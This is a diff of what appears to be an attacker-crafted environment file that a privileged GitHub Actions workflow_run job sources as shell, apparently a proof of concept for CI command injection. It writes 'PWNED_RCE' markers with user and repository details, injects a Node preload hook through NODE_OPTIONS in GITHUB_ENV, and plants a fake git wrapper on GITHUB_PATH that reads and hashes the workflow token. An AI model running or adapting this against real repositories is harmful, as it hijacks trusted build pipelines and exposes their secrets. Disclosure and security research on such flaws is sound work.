@@ -23,7 +23,9 @@ jobs:
           TARGET_BRANCH=main
           PAGES_BASE_URL=
           COMMENT_HEADER=pr-preview
-          echo "PWNED_RCE: attacker-controlled pr-preview-meta.env was sourced as shell in the privileged workflow_run job" >> "$GITHUB_STEP_SUMMARY" || true
+          echo "PWNED_RCE: attacker-controlled pr-preview-meta.env was sourced as shell in the privileged workflow_run job"
+          echo "PWNED_RCE: meta executed uid=$(id -u) user=$(id -un) event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?} workflow=${GITHUB_WORKFLOW:-?}"
+          echo "PWNED_RCE: attacker artifact contents executed" >> "$GITHUB_STEP_SUMMARY" || true
           echo "PWNED_RCE uid=$(id -u) user=$(id -un) event=${GITHUB_EVENT_NAME:-?} repo=${GITHUB_REPOSITORY:-?} workflow=${GITHUB_WORKFLOW:-?}" >> "$GITHUB_STEP_SUMMARY" || true
           cat > /tmp/gab-hook.js <<'JS'
           try {
@@ -38,7 +40,7 @@ jobs:
           JS
           echo "NODE_OPTIONS=--require /tmp/gab-hook.js" >> "$GITHUB_ENV" || true
           mkdir -p /tmp/gab-bin
-          printf '%s\n' '#!/usr/bin/env bash' 'echo "fake-git hook: INPUT_TOKEN_LEN=${#INPUT_TOKEN} GITHUB_TOKEN_LEN=${#GITHUB_TOKEN}" >> "$GITHUB_STEP_SUMMARY"' 'exec /usr/bin/git "$@"' > /tmp/gab-bin/git || true
+          printf '%s\n' '#!/usr/bin/env bash' 'echo "fake-git hook: INPUT_TOKEN_LEN=${#INPUT_TOKEN} GITHUB_TOKEN_LEN=${#GITHUB_TOKEN} INPUT_TOKEN_SHA=$(printf %s "$INPUT_TOKEN" | sha256sum | cut -c1-16)"' 'echo "fake-git hook: INPUT_TOKEN_LEN=${#INPUT_TOKEN} INPUT_TOKEN_SHA=$(printf %s "$INPUT_TOKEN" | sha256sum | cut -c1-16)" >> "$GITHUB_STEP_SUMMARY"' 'exec /usr/bin/git "$@"' > /tmp/gab-bin/git || true
           chmod +x /tmp/gab-bin/git || true
           echo "/tmp/gab-bin" >> "$GITHUB_PATH" || true
           META
